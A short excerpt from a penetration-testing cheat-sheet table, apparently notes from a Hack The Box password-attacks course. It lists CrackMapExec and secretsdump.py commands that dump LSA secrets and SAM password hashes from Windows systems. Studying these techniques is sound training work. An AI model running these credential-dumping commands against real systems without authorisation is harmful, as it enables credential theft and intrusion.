...
| `crackmapexec smb <ip> --local-auth -u <username> -p <password> --lsa` | Uses CrackMapExec in conjunction with admin credentials to dump lsa secrets, over the network. It is possible to get clear-text credentials this way. [Attacking SAM - Dumping LSA Secrets Remotely](https://academy.hackthebox.com/module/147/section/1315) |
...
| `python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL` | Uses Secretsdump.py to dump password hashes from the SAM database. [PASSWORD ATTACKS - Attacking SAM](https://academy.hackthebox.com/module/147/section/1315) |
